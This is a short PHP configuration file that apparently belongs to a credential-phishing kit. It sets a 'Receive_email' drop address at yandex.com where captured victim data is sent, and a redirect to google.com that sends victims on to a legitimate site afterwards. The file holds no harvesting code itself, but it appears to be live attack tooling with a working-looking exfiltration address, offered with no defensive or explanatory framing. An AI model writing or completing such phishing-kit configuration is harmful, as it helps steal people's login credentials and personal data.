<?php 
$Receive_email="checkmyresult2022@yandex.com";
$redirect="https://www.google.com/";
?>